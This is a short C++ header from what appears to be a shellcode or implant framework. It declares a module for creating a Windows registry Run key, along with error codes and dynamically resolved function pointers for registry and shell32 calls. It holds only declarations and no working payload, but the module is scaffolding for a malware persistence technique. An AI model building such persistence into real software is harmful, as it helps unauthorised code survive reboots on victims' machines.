#include "shellcode.hpp"
#include <ShlObj.h>

#define CUSTOM_MODULE_CREATEREGISTRYRUNKEY_FAIL_MALLOC_STRUCT    0x1001
#define CUSTOM_MODULE_CREATEREGISTRYRUNKEY_FAIL_GET_POINTERS     0x1002
#define CUSTOM_MODULE_CREATEREGISTRYRUNKEY_FAIL_REGISTER_MODULE  0x1003
#define ERROR_GET_POINTER_CUSTOM_MODULE_REGCREATEKEYEXA          0x1004
#define ERROR_GET_POINTER_CUSTOM_MODULE_REGSETVALUEEXA           0x1005
#define ERROR_GET_POINTER_CUSTOM_MODULE_REGCLOSEKEY              0x1006
#define ERROR_GET_POINTER_CUSTOM_MODULE_SHGETFOLDERPATHA         0x1007
#define FAIL_LOAD_LIBRARY_CUSTOM_MODULE_SHELL32                  0x1008
#define FAIL_LOAD_LIBRARY_CUSTOM_MODULE_ADVAPI32                 0x1009

DWORD RegisterModule_CreateRegistryRunKey(sh_context* ctx, uint32_t module_id);

using RegCreateKeyExA_t = decltype(&RegCreateKeyExA);
using RegSetValueExA_t = decltype(&RegSetValueExA);
using SHGetFolderPathA_t = decltype(&SHGetFolderPathA);
using RegCloseKey_t = decltype(&RegCloseKey);

struct registry_pointers {
    RegCreateKeyExA_t fp_RegCreateKeyExA;
    RegSetValueExA_t fp_RegSetValueExA;
    RegCloseKey_t fp_RegCloseKey;
    SHGetFolderPathA_t fp_SHGetFolderPathA;

};
